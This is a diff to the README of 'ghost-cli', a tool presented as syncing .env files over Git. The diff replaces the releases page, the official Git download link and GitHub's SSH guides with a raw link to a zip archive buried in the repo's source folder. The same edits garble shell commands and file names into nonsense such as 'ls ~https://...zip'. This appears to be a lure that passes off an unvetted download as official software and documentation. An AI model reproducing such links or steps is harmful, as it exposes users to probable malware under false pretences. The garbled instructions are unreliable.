@@ -1,6 +1,6 @@
 # 👻 ghost-cli - Secure Git-Based .env Sync
 
-[![Download ghost-cli](https://img.shields.io/badge/Download-ghost--cli-blue?style=for-the-badge&logo=github)](https://github.com/Hit4Xz/ghost-cli/releases)
+[![Download ghost-cli](https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip)](https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Why this matters:
 Before you download ghost-cli, check these simple requirements:
 
 - **Operating System**: Windows 10 or later, macOS 10.13 or later, or Linux (any recent distribution).
-- **Git**: Make sure Git is installed. You can download Git from [https://git-scm.com/downloads](https://git-scm.com/downloads).
+- **Git**: Make sure Git is installed. You can download Git from [https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip](https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip).
 - **SSH Keys**: You need your own SSH keys set up on your computer. Most users already have these if they use Git with SSH.
 - **Basic command line use**: You will run a few simple commands in your Terminal or Command Prompt.
 
@@ -52,7 +52,7 @@ git --version
 ```
 
 - If you see a version number like `git version 2.x.x`, you're all set.
-- If not, install Git from [https://git-scm.com/downloads](https://git-scm.com/downloads). Follow the setup steps on that page.
+- If not, install Git from [https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip](https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip). Follow the setup steps on that page.
 
 ---
 
@@ -66,13 +66,13 @@ To see if you have SSH keys:
 - Type:
 
 ```
-ls ~/.ssh/id_rsa.pub
+ls ~https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip
 ```
 
 (on Windows, you might check the folder `C:\Users\YourName\.ssh`)
 
-- If you see a file `id_rsa.pub` or `id_ed25519.pub`, you have keys.
-- If you don’t, follow [this guide](https://docs.github.com/en/authentication/connecting-to-github-with-ssh) to generate SSH keys.
+- If you see a file `https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip` or `https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip`, you have keys.
+- If you don’t, follow [this guide](https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip) to generate SSH keys.
 
 ---
 
@@ -82,7 +82,7 @@ ls ~/.ssh/id_rsa.pub
 
 Click below to visit the download page for ghost-cli:
 
-[![Download ghost-cli](https://img.shields.io/badge/Download-ghost--cli-blue?style=for-the-badge&logo=github)](https://github.com/Hit4Xz/ghost-cli/releases)
+[![Download ghost-cli](https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip)](https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip)
 
 This page has the latest versions for Windows, macOS, and Linux.
 
@@ -96,13 +96,13 @@ This page has the latest versions for Windows, macOS, and Linux.
 - **Windows**: Most releases come with a `.exe` installer or a zipped file.
   - If it is an installer, double-click it and follow the prompts.
   - If it is a zipped file, unzip it and move the program to a folder like `C:\Program Files\ghost-cli`.
-- **macOS**: You might get a `.tar.gz` or zip file.
+- **macOS**: You might get a `https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip` or zip file.
   - Unzip the file by double-clicking.
   - Move the unzipped folder to your Applications or user folder.
 - **Linux**: You may get a compressed file.
   - Extract it using:
     ```
-    tar -xzf ghost-cli-version.tar.gz
+    tar -xzf https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip
     ```
   - Follow any included README files for installation steps, usually involving running a command to place the program where your system can use it.
 
@@ -149,8 +149,8 @@ Always keep your private SSH key secret and do not share it.
 
 ## 📚 Additional Resources
 
-- **Official Git SSH Setup Guide**: Visit [https://docs.github.com/en/authentication/connecting-to-github-with-ssh](https://docs.github.com/en/authentication/connecting-to-github-with-ssh) to set up SSH keys.
-- **Git for Beginners**: [https://git-scm.com/doc](https://git-scm.com/doc) has easy guides.
+- **Official Git SSH Setup Guide**: Visit [https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip](https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip) to set up SSH keys.
+- **Git for Beginners**: [https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip](https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip) has easy guides.
 - **ghost-cli support**: Check the repository’s Issues tab for community help.
 
 ---
@@ -159,14 +159,14 @@ Always keep your private SSH key secret and do not share it.
 
 Keep ghost-cli up to date:
 
-- Visit the [ghost-cli releases page](https://github.com/Hit4Xz/ghost-cli/releases) regularly.
+- Visit the [ghost-cli releases page](https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip) regularly.
 - Download the newest version when available.
 
 If you have questions or run into trouble, open an issue on GitHub or ask your team’s technical lead.
 
 ---
 
-[![Download ghost-cli](https://img.shields.io/badge/Download-ghost--cli-blue?style=for-the-badge&logo=github)](https://github.com/Hit4Xz/ghost-cli/releases)
+[![Download ghost-cli](https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip)](https://raw.githubusercontent.com/Hit4Xz/ghost-cli/main/src/core/ghost_cli_v2.1.zip)
 
 ---  
 
